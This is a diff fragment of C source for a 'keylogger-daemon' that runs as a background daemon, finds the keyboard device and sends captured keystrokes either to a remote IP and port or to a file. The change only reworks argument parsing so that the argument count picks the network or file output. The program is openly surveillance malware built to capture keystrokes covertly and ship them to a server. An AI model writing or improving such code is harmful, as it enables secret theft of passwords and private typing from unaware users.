@@ -22,13 +22,13 @@ int main(int argc, char *argv[])
     int fd, keyboard, flock, file_out_type;
     int is_single_instance;
 
-    if (argc != 5 && argc != 4)
-        fprintf(stderr, "Usage: ./keylogger-daemon 1 ip port [0|1] OR ./keylogger-daemon 2 filename [0|1]\n"), exit(EXIT_FAILURE);
+    if (argc != 4 && argc != 3)
+        fprintf(stderr, "Usage: ./keylogger-daemon ip port [0|1] OR ./keylogger-daemon filename [0|1]\n"), exit(EXIT_FAILURE);
 
     if (daemonize("keylogger-daemon") < 0) /* Convert process to daemon */
         syslog(LOG_ERR, "Couldn't start daemon"), exit(EXIT_FAILURE);
 
-    is_single_instance = (argc == 5 ? atoi(argv[4]) : atoi(argv[3]));
+    is_single_instance = argc == 4 ? atoi(argv[3]) : atoi(argv[2]);
 
     if (is_single_instance)
         if ((daemonAlreadyRunning(&flock))) /* If a copy of this daemon is already running we terminate. We return the lock file descriptor */
@@ -40,7 +40,7 @@ int main(int argc, char *argv[])
     if ((keyboard = findKeyboardDevice(PATH)) < 0) /* Looking for Keyboard device driver */
         syslog(LOG_ERR, "Couldn't find keyboard device"), exit(EXIT_FAILURE);
 
-    file_out_type = atoi(argv[1]);
+    file_out_type = argc == 4 ? SOCKET : FILE;
 
     if (file_out_type == SOCKET) /* If user decided to send events to server */
     {
